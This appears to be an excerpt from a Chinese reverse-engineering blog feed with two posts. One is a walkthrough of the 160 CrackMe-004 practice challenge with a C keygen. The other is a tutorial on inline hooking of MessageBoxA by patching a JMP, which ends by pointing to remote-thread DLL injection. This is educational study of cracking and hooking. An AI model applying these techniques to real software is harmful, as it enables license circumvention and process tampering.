    <url>/2021/07/29/160CrackMe-004/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序，看到需要输入用户名和注册码，提示如果正确下面会出现一张朱茵的照片。</p><p><img src="/2021/07/29/160CrackMe-004/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>使用DIE查看一下，无壳，使用Delphi编写的。</p><p><img src="/2021/07/29/160CrackMe-004/2.png"></p><p>使用OD搜索一下字符串，可以看到几个字符串，其中有恭喜注册成功的字样，可以看到还有黑头这样的问题，但是点进去查看没有什么。</p><p><img src="/2021/07/29/160CrackMe-004/3.png"></p><p>下断点在恭喜这里，但是看不到什么有用的信息，在获取用户名的长度，然后加上循环次数这样，但是这并不是注册码，然后跳转的关键在esi+0x30c这里，如果这里的值不等于0x85就会跳转到失败。</p><p><img src="/2021/07/29/160CrackMe-004/4.png"></p><p>此时想到刚才的黑头这样的字样，在程序中出现这样的感觉多少会和注册码有点关系。</p><p>那个地方只有在程序运行的时候才会到达，当跑起来下断是不会断下来的，那里如果出现这样的字眼，并且调用的都是同一个函数，那么有没有可能就是把字符串存在内存里，找到地方下一个断点看看，如果注册码确实用到的话肯定会调用。</p><p>根据字符串找到地方跟一下，发现这里有一个地方向一个地址写入了这些字符串，在这里下一个硬件访问断点看看。</p><p><img src="/2021/07/29/160CrackMe-004/5.png"></p><p>下断点之后，刚输入注册码就断下来在一个地方，跑几步，看到寄存器有一个值，这很像注册码。</p><p><img src="/2021/07/29/160CrackMe-004/6.png"></p><p>大致分析看一下，可以看到在这里有一个向esi+0x30c写入3c的地方，这里有一个JNZ决定是否执行，那么这里应该是一个很关键的地方</p><p><img src="/2021/07/29/160CrackMe-004/7.png"></p><p>看这里，在前面进行了一个比较，然后决定是否跳转。12345是我们输入的注册码</p><p>而黑头Sun Bird12dseloffc-012-OKb1ackie这个是生成的，可以看到b1ackie是用户名目前只有中间这个12不知道是如何生成的，继续分析一下。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00457D2C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> E<span class="hljs-number">0</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">20</span>]                  ;  输入的注册码<br><span class="hljs-attribute">00457D2F</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">93</span> <span class="hljs-number">18030000</span> mov edx,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">318</span>]                 ;  生成的<br><span class="hljs-attribute">00457D35</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">52</span>BFFAFF   call CKme.<span class="hljs-number">00403</span>C<span class="hljs-number">8</span>C<br><span class="hljs-attribute">00457D3A</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">0</span>A         jnz short CKme.<span class="hljs-number">00457</span>D<span class="hljs-number">46</span><br><span class="hljs-attribute">00457D3C</span>  |.  C<span class="hljs-number">783</span> <span class="hljs-number">0</span>C<span class="hljs-number">030000</span>&gt;mov dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">30</span>C],<span class="hljs-number">0</span>x<span class="hljs-number">3</span>E<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/29/160CrackMe-004/8.png"></p><p>这个数字是在前面生成的，是根据输入用户名的长度加上0x5生成的。ebx+0x2F8中是长度，可以通过同样的下断点方法去分析这里的值。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00457C66</span>  |.  <span class="hljs-number">8</span>BB<span class="hljs-number">3</span> F<span class="hljs-number">8020000</span> mov esi,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>F<span class="hljs-number">8</span>]                 ;  用户名长度<br><span class="hljs-attribute">00457C6C</span>  |.  <span class="hljs-number">83</span>C<span class="hljs-number">6</span> <span class="hljs-number">05</span>       add esi,<span class="hljs-number">0</span>x<span class="hljs-number">5</span>                                      ;  加上<span class="hljs-number">0</span>x<span class="hljs-number">5</span><br><span class="hljs-attribute">00457C6F</span>  |.  FFB<span class="hljs-number">3</span> <span class="hljs-number">10030000</span> push dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">310</span>]<br><span class="hljs-attribute">00457C75</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00457C78</span>  |.  <span class="hljs-number">8</span>BC<span class="hljs-number">6</span>          mov eax,esi<br><span class="hljs-attribute">00457C7A</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">85</span>FEFAFF   call CKme.<span class="hljs-number">00407</span>B<span class="hljs-number">04</span>                               ;  转字符串（<span class="hljs-number">10</span>进制）<br></code></pre></div></td></tr></table></figure><p>这里只要相等就会给关键地址赋值0x3E，但是并不是0x85，继续在这里下断点看一下什么情况。（此时输入黑头Sun Bird12dseloffc-012-OKb1ackie就可以注册成功，不过点击一次是不行的，要连续点击好几次才行）</p><p>但是每次点击都会断在恭喜的那个JNZ那里，可以发现值并没有被改变，还是3E，是我断点的问题，不要下访问断点，改成写入断点，看看在哪里可以写入85。</p><p><img src="/2021/07/29/160CrackMe-004/9.png"></p><p>然后疯狂点击图片，就会断下来，可以看到这里先判断是否等于0x3E然后再赋值0x85。</p><p><img src="/2021/07/29/160CrackMe-004/10.png"></p><p>什么情况才会到这里，其实就是双击会到这里，而普通的点击就是刚开始0x85比较那里，还是借助Dedark工具可以看的更仔细，可以看到事件，用这个工具可以很方便的定位到刚才的几个地方而不需要借助硬件断点，很方便。</p><p><img src="/2021/07/29/160CrackMe-004/12.png"></p><p>那么现在整个流程就清楚了，需要输入正确的注册码之后，先双击再点击就可以成功注册。</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>注册码很简单，获取用户名的长度，然后加上5，放在黑头Sun Bird和dseloffc-012-OK中间，最后再加上用户名即可。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name：\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br>len += <span class="hljs-number">5</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注册码：\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;黑头Sun Bird%ddseloffc-012-OK%s&quot;</span>, len, name);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/29/160CrackMe-004/13.png"></p><p><img src="/2021/07/29/160CrackMe-004/11.png"></p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HOOK-Inline Hook</title>
    <link href="/2021/07/28/HOOK-Inline%20Hook/"/>
    <url>/2021/07/28/HOOK-Inline%20Hook/</url>
    
    <content type="html"><![CDATA[<h4 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h4><p>Inline Hook是Hook技术的一种，它是通过修改机器码来实现HOOK。当我们正常调用一个API函数时，正常的流程是，call API，然后就会到函数内部执行。我们写下如下语句，在OD中打开就是如图的样子。可以看到先压入参数，然后调用MessageBoxA函数。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;这是本来的窗口&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/28/HOOK-Inline%20Hook/1.png"></p><p>进入函数可以看到函数的具体</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/2.png"></p><p>Inline Hook就是了通过字节码更改了函数的流程，刚才我们看到的是正常的流程，如果调用正常函数的时候，我们修改它的执行流程，使其跳转到我们自定义的函数内部去执行就可以实现Inlie HOOK。</p><h4 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h4><p>通过上面我们知道了，我们需要修改的就是程序的执行流程，而改变程序的执行流程就是jmp、call等，我们用最常见的jmp来进行分析。</p><p>如图可以看到一条JMP指令，看到后面的地址是0x401254，再看旁边的机器码是E9 EF000000。我们知道E9是JMP的机器码，那么EF000000为什么和要跳转的地址不一样呢。这是因为在JMP后面使用的是一个偏移量而不是一个具体的地址。如果使用地址的话，数据重定位之后，每次都会变，但是使用偏移就不一样了。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00401160 </span>  . /E9 EF000000        jmp InlineHo.<span class="hljs-number">00401254</span><br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/28/HOOK-Inline%20Hook/3.png"></p><p>JMP后的偏移计算公式是：</p><p>偏移=目的地址-原地址-5</p><p>5是JMP指令的长度，如果是其他的一些指令的话，那么这里不是5，可能是6、7所以要注意要根据具体情况而来。</p><p>想要用JMP进行修改，我们就需要构造机器码修改前五个字节。来尝试HOOK一下MessageBox函数。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">My_MessageBoxA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ UINT uType)</span></span>;<br>FARPROC MessageBoxAAddress;<br>BYTE NewData[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>,<span class="hljs-number">0</span> &#125;;<br>BYTE OldData[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InlineHook</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UnInlineHook</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;原始窗口1&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br>    <span class="hljs-built_in">InlineHook</span>();<br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;原始窗口2&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br>    <span class="hljs-built_in">UnInlineHook</span>();<br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;原始窗口3&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InlineHook</span><span class="hljs-params">()</span> </span>&#123;<br>    MessageBoxAAddress = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>), <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>    <span class="hljs-comment">//保存原数据</span><br>    <span class="hljs-built_in">memcpy</span>(OldData, MessageBoxAAddress, <span class="hljs-number">5</span>);<br>    <span class="hljs-comment">//计算需要跳转的偏移</span><br>    DWORD dwOffset = (DWORD)My_MessageBoxA - (DWORD)MessageBoxAAddress  - <span class="hljs-number">5</span>;<br>    <span class="hljs-comment">//写入新数据，跳转的偏移</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;NewData[<span class="hljs-number">1</span>], &amp;dwOffset, <span class="hljs-number">5</span>);<br><br>    DWORD dwOldprotect = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//修改页属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldprotect);<br>    <span class="hljs-comment">//写入五个字节</span><br>    <span class="hljs-built_in">memcpy</span>(MessageBoxAAddress, NewData, <span class="hljs-number">5</span>);<br>    <span class="hljs-comment">//恢复页属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, dwOldprotect, &amp;dwOldprotect);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UnInlineHook</span><span class="hljs-params">()</span> </span>&#123;<br>    MessageBoxAAddress = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>), <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>    DWORD dwOldProtect = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br>    <span class="hljs-comment">//恢复原来的字节码</span><br>    <span class="hljs-built_in">memcpy</span>(MessageBoxAAddress, OldData, <span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, dwOldProtect, &amp;dwOldProtect);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">My_MessageBoxA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ UINT uType)</span> </span>&#123;<br>    <span class="hljs-comment">//先恢复原来的字节码，然后调用正常的MessageboxA弹窗</span><br>    <span class="hljs-built_in">UnInlineHook</span>();<br>    <span class="hljs-keyword">int</span> bRet = <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Inline Hook\ni am b1ackie!!!&quot;</span>, <span class="hljs-string">&quot;hook&quot;</span>, MB_OK);<br>    <span class="hljs-built_in">InlineHook</span>();<br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到有三个弹窗，正常流程下肯定是1,2,3但是我们Inline Hook了MessageBoxA函数，并且将其中内容改了，如果成功的话，第二个弹窗会不一样，运行程序查看效果。</p><p>先是第一个正常的窗口</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/4.png"></p><p>然后是第二个窗口，开始了InlineHook，可以看到并没有弹出原始窗口2，说明此时已经被HOOK了</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/5.png"></p><p>第三个窗口再取消InlineHook后弹出正常的窗口</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/6.png"></p><p>现在使用OD载入程序来看一下，直接查看第二个MessageBoxA函数，进入查看可以看到函数头部已经改变了，变成了JMP。</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/7.png"></p><p>跳过来看，就是我们自己编写的My_MessageBoxA函数</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00401170</span> &gt;/.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00401171</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00401173</span>  |.  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x<span class="hljs-number">8</span><br><span class="hljs-attribute">00401176</span>  |.  A<span class="hljs-number">1</span> <span class="hljs-number">04304100</span>   mov eax,dword ptr ds:[__security_cookie_fai&gt;<br><span class="hljs-attribute">0040117B</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">5</span>          xor eax,ebp<br><span class="hljs-attribute">0040117D</span>  |.  <span class="hljs-number">8945</span> FC       mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>],eax<br><span class="hljs-attribute">00401180</span>  |.  <span class="hljs-number">56</span>            push esi<br><span class="hljs-attribute">00401181</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">4</span>C<span class="hljs-number">1</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">4</span>C                      ; /MessageBoxA<br><span class="hljs-attribute">00401186</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">581</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">58</span>                      ; |/user<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">0040118B</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">04</span>D<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;KERNEL<span class="hljs-number">32</span>.LoadLibraryA&gt;&gt;; |\LoadLibraryA<br><span class="hljs-attribute">00401191</span>  |.  <span class="hljs-number">50</span>            push eax                                    ; |hModule = <span class="hljs-number">00000001</span><br><span class="hljs-attribute">00401192</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">08</span>D<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;KERNEL<span class="hljs-number">32</span>.GetProcAddres&gt;; \GetProcAddress<br><span class="hljs-attribute">00401198</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">35</span> <span class="hljs-number">00</span>D<span class="hljs-number">04000</span> mov esi,dword ptr ds:[&lt;&amp;KERNEL<span class="hljs-number">32</span>.VirtualPro&gt;;  kernel<span class="hljs-number">32</span>.VirtualProtect<br><span class="hljs-attribute">0040119E</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">4</span>D F<span class="hljs-number">8</span>       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">004011A1</span>  |.  <span class="hljs-number">51</span>            push ecx                                    ; /pOldProtect = <span class="hljs-number">049</span>BE<span class="hljs-number">914</span><br><span class="hljs-attribute">004011A2</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">40</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">40</span>                                   ; |NewProtect = PAGE_EXECUTE_READWRITE<br><span class="hljs-attribute">004011A4</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">05</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">5</span>                                    ; |Size = <span class="hljs-number">0</span>x<span class="hljs-number">5</span><br><span class="hljs-attribute">004011A6</span>  |.  <span class="hljs-number">50</span>            push eax                                    ; |Address = <span class="hljs-number">00000001</span><br><span class="hljs-attribute">004011A7</span>  |.  A<span class="hljs-number">3</span> A<span class="hljs-number">0424100</span>   mov dword ptr ds:[MessageBoxAAddressfailure&gt;; |<br><span class="hljs-attribute">004011AC</span>  |.  C<span class="hljs-number">745</span> F<span class="hljs-number">8</span> <span class="hljs-number">00000</span>&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span>              ; |<br><span class="hljs-attribute">004011B3</span>  |.  FFD<span class="hljs-number">6</span>          call esi                                    ; \VirtualProtect<br><span class="hljs-attribute">004011B5</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">0</span>D A<span class="hljs-number">0424100</span> mov ecx,dword ptr ds:[MessageBoxAAddressfai&gt;;  user<span class="hljs-number">32</span>.MessageBoxA<br><span class="hljs-attribute">004011BB</span>  |.  A<span class="hljs-number">1</span> <span class="hljs-number">98424100</span>   mov eax,dword ptr ds:[OldDatan_table]<br><span class="hljs-attribute">004011C0</span>  |.  <span class="hljs-number">8901</span>          mov dword ptr ds:[ecx],eax<br><span class="hljs-attribute">004011C2</span>  |.  A<span class="hljs-number">0</span> <span class="hljs-number">9</span>C<span class="hljs-number">424100</span>   mov al,byte ptr ds:[<span class="hljs-number">0</span>x<span class="hljs-number">41429</span>C]<br><span class="hljs-attribute">004011C7</span>  |.  <span class="hljs-number">8841</span> <span class="hljs-number">04</span>       mov byte ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>],al<br><span class="hljs-attribute">004011CA</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">004011CD</span>  |.  <span class="hljs-number">50</span>            push eax                                    ; /pOldProtect = <span class="hljs-number">00000001</span><br><span class="hljs-attribute">004011CE</span>  |.  FF<span class="hljs-number">75</span> F<span class="hljs-number">8</span>       push dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]                 ; |NewProtect = PAGE_NOACCESS|PAGE_WRITECOPY|PAGE_EXECUTE|PAGE_EXECUTE_READWRITE|MEM_COMMIT|<span class="hljs-number">400400</span><br><span class="hljs-attribute">004011D1</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">05</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">5</span>                                    ; |Size = <span class="hljs-number">0</span>x<span class="hljs-number">5</span><br><span class="hljs-attribute">004011D3</span>  |.  <span class="hljs-number">51</span>            push ecx                                    ; |Address = <span class="hljs-number">049</span>BE<span class="hljs-number">914</span><br><span class="hljs-attribute">004011D4</span>  |.  FFD<span class="hljs-number">6</span>          call esi                                    ; \VirtualProtect<br><span class="hljs-attribute">004011D6</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                    ; /Style = MB_OK|MB_APPLMODAL<br><span class="hljs-attribute">004011D8</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">641</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">64</span>                      ; |hook<br><span class="hljs-attribute">004011DD</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">6</span>C<span class="hljs-number">1</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">6</span>C                      ; |Inline Hook\ni am b<span class="hljs-number">1</span>ackie!!!<br><span class="hljs-attribute">004011E2</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                    ; |hOwner = NULL<br><span class="hljs-attribute">004011E4</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">10</span>D<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;USER<span class="hljs-number">32</span>.MessageBoxA&gt;]   ; \MessageBoxA<br><span class="hljs-attribute">004011EA</span>  |.  <span class="hljs-number">8</span>BF<span class="hljs-number">0</span>          mov esi,eax<br><span class="hljs-attribute">004011EC</span>  |.  E<span class="hljs-number">8</span> CFFEFFFF   call InlineHo.InlineHook_ansi_nolocketaryso&gt;<br><span class="hljs-attribute">004011F1</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">4</span>D FC       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">004011F4</span>  |.  <span class="hljs-number">8</span>BC<span class="hljs-number">6</span>          mov eax,esi<br><span class="hljs-attribute">004011F6</span>  |.  <span class="hljs-number">33</span>CD          xor ecx,ebp<br><span class="hljs-attribute">004011F8</span>  |.  <span class="hljs-number">5</span>E            pop esi                                     ;  InlineHo.<span class="hljs-number">0040103</span>C<br><span class="hljs-attribute">004011F9</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">06000000</span>   call InlineHo.__security_check_cookiepresen&gt;<br><span class="hljs-attribute">004011FE</span>  |.  <span class="hljs-number">8</span>BE<span class="hljs-number">5</span>          mov esp,ebp<br><span class="hljs-attribute">00401200</span>  |.  <span class="hljs-number">5</span>D            pop ebp                                     ;  InlineHo.<span class="hljs-number">0040103</span>C<br><span class="hljs-attribute">00401201</span>  \.  C<span class="hljs-number">2</span> <span class="hljs-number">1000</span>       retn <span class="hljs-number">0</span>x<span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><h4 id="注入方式实现inline-hook"><a href="#注入方式实现inline-hook" class="headerlink" title="注入方式实现inline hook"></a>注入方式实现inline hook</h4><p>我们可以将inline hook写成一个dll文件，然后通过远线程注入的方式，将其注入到进程中。</p><p>远程线程的具体实现：<a href="https://b1ack1e.github.io/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/">注入技术-远程线程注入</a></p><p>编写一个弹窗，实现效果如下</p><p><img 